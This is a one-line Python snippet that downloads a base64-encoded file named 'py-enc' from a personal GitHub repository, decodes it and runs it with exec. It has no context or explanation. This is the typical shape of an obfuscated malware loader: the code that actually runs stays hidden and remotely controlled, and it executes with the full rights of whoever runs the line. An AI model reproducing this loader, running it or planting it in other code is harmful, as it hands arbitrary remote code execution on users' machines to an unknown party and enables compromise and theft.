import urllib.request;import base64;exec(base64.b64decode(urllib.request.urlopen('https://raw.githubusercontent.com/PXTDEV9022/tiendev/refs/heads/main/py-enc').read().decode('utf-8')))
